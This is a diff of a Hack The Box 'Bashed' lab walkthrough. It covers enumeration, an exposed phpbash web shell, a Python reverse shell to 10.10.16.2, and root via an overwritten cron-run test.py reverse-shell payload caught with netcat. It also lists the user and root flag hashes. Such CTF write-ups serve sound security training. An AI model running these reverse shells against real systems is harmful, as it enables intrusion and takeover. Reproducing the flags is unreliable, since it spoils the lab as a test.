@@ -1,33 +1,46 @@
 # HTB: Bashed
 
 ## Engagement Overview
-**Target:** HTB – Bashed  
-**Box IP:** 10.10.10.68
-**Date:** 2025-07-06
+
+**Target:** Bashed (HTB)  
+**Box IP:** 10.10.10.68  
+**Date:** 2025-07-06  
 
 ---
 
 ### Objectives
-- Enumerate open services and directories
-- Gain initial foothold via exposed web shell
-- Escalate to user and root
-- Capture user and root flags
+
+- Enumerate open services and directories  
+- Gain initial foothold via exposed web shell  
+- Escalate to user and root  
+- Capture user and root flags  
 
 ---
 
 ## Service Enumeration
 
-```
+### Nmap
+
+```bash
 nmap -sC -sV -oN nmap.txt 10.10.10.68
 ```
 
-- Port 80 open – Apache httpd 2.4.18 (Ubuntu)
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
+```
+
 - Web page title: *Arrexel's Development Site*
 
-**Directory Enumeration (Dirbuster):**
-- `/dev/phpbash.min.php`
-- `/dev/phpbash.php`
-- `/uploads/`
+### Directory Enumeration
+
+```bash
+dirbuster -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
+```
+
+- `/dev/phpbash.min.php`  
+- `/dev/phpbash.php`  
+- `/uploads/`  
 
 ---
 
@@ -39,18 +52,20 @@ Accessing the exposed shell at:
 http://10.10.10.68/dev/phpbash.php
 ```
 
-Confirms web shell as `www-data`:
+Confirmed `www-data`:
+
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Reverse Shell Upgrade
+### Reverse Shell
 
 ```bash
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.2",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Upgraded with:
+Upgraded shell:
+
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -65,58 +80,66 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 (ALL : ALL) NOPASSWD: ALL
 ```
 
-Switched to `scriptmanager`, discovered `/scripts/` directory is writable and contains:
+Switched to `scriptmanager`, found writable `/scripts/` directory:  
 
 ```
--rw-r--r-- 1 scriptmanager scriptmanager   test.py
--rw-r--r-- 1 root          root            test.txt
+-rw-r--r-- 1 scriptmanager scriptmanager test.py
+-rw-r--r-- 1 root          root          test.txt
 ```
 
-Noted `test.txt` is regularly overwritten — likely a root cron job running `test.py`.
+`test.txt` overwritten by cron → root executes `test.py`.  
 
-### Gained Root Shell via Cron Execution
+### Root via Cron
 
-Overwrote `test.py` with a reverse shell payload:
+Replaced `test.py` with reverse shell payload:
 
 ```python
-import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.10.16.2",1337));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.2",1337))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 ```
 
-Caught root shell via netcat listener.
+Caught root shell with netcat listener:  
+
+```bash
+nc -lvnp 1337
+```
 
 ---
 
-## Post-Exploitation
+## House Cleaning
 
-**Flags:**
-- `user.txt`: `501893517418a7460a6f616a86f3fd82`
-- `root.txt`: `25a9eb38a763d8a0f04af9a3fc390ee7`
+**Flags:**  
+
+- `user.txt`: `501893517418a7460a6f616a86f3fd82`  
+- `root.txt`: `25a9eb38a763d8a0f04af9a3fc390ee7`  
+
+- Removed malicious `test.py` after escalation.  
+- No persistence left on target.  
 
 ---
 
 ## Tools Utilized
 
-- `nmap`
-- `dirbuster`
-- Python reverse shell
-- `linuxprivchecker`
-- `/dev/phpbash.php` interactive shell
+- `nmap`, `dirbuster`  
+- Python reverse shell  
+- `/dev/phpbash.php` interactive shell  
+- `linuxprivchecker`  
 
-References:
-- https://github.com/sleventyeleven/linuxprivchecker
-- https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2
+References:  
+
+- https://github.com/sleventyeleven/linuxprivchecker  
+- https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2  
 
 ---
 
 ## Key Takeaways
 
-- Early enumeration can reveal dangerous dev artifacts like `phpbash.php` — always check `/dev/`, `/test/`, and `/uploads/`
-- Reverse shells can be stabilized and upgraded quickly using Python and TTY tricks — important for chaining escalation steps
-- Cron jobs running scripts owned or writable by non-root users are a goldmine for privesc
-- Use of `sudo` without a password by secondary users (like `scriptmanager`) can be leveraged even without direct root access
+- Dev artifacts like `phpbash.php` can provide immediate shells.  
+- Python reverse shells + TTY upgrades are critical for stability.  
+- Cron jobs with writable scripts enable easy privilege escalation.  
+- `sudo` misconfigurations with secondary users (e.g. `scriptmanager`) are dangerous and should be audited.  
